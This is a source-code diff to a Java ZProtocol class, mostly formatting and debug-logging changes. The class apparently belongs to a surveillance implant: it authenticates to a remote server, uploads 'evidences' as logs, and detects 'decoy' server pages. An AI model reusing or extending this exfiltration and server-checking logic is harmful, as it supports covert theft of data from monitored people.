@@ -38,7 +38,7 @@ public class ZProtocol extends Protocol {
 
     private static final int SHA1LEN = 20;
     //#ifdef DEBUG
-    private static Debug debug = new Debug("ZProtocol", DebugLevel.INFORMATION);
+    private static Debug debug = new Debug("ZProtocol", DebugLevel.VERBOSE);
     //#endif
 
     private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();
@@ -69,9 +69,9 @@ public class ZProtocol extends Protocol {
         //#endif
 
         try {
-            
+
             transport.start();
-            
+
             //#ifdef DEBUG
             debug.info("***** Authentication *****");
             //#endif          
@@ -180,9 +180,10 @@ public class ZProtocol extends Protocol {
         } catch (Exception e) {
             //#ifdef DEBUG
             debug.error(e);
+            e.printStackTrace();
             //#endif
             return false;
-        }finally {
+        } finally {
             transport.close();
         }
     }
@@ -244,13 +245,13 @@ public class ZProtocol extends Protocol {
 
     protected void parseAuthentication(byte[] authResult)
             throws ProtocolException {
-        if(authResult.length != 64){
+        if (authResult.length != 64) {
             //#ifdef DEBUG
             debug.trace("parseAuthentication: wrong size. Probably a decoy.");
             //#endif
             throw new ProtocolException(14);
         }
-               
+
         //#ifdef DEBUG
         debug.trace("decodeAuth result = " + Utils.byteArrayToHex(authResult));
         //#endif
@@ -702,8 +703,8 @@ public class ZProtocol extends Protocol {
                 Utils.copy(plainOut, 4, content, 0, content.length);
 
                 byte[] response = command(Proto.LOG, plainOut);
-                plainOut=null;
-                
+                plainOut = null;
+
                 boolean ret = parseLog(response);
 
                 if (ret) {
@@ -720,12 +721,12 @@ public class ZProtocol extends Protocol {
                 debug.warn("Not empty directory");
                 //#endif
             }
-            
+
             //#ifdef DEBUG
             debug.trace("    dir finished: " + dir);
             //#endif
         }
-        
+
         //#ifdef DEBUG
         debug.trace("sendEvidences finished");
         //#endif
@@ -777,7 +778,6 @@ public class ZProtocol extends Protocol {
         }
     }
 
-
     private byte[] cypheredWriteReadSha(byte[] plainOut)
             throws TransportException, CryptoException {
         //#ifdef DEBUG
@@ -789,13 +789,14 @@ public class ZProtocol extends Protocol {
         //#ifdef DEBUG        
         debug.trace("cypherOut: " + cypherOut.length);
         //#endif
-        
+
         byte[] cypherIn = transport.command(cypherOut);
-       
-        String result=new String(cypherIn);
-        if(result.indexOf("<meta http-equiv=\"refresh\" content") >= 0){
+
+        String result = new String(cypherIn);
+        if (result != null
+                && result.indexOf("<meta http-equiv=\"refresh\" content") >= 0) {
             //#ifdef DEBUG
-            debug.error("cypheredWriteReadSha: DECOY PAGE DETECTED!" );
+            debug.error("cypheredWriteReadSha: DECOY PAGE DETECTED!");
             //#endif
             throw new TransportException(30);
         }
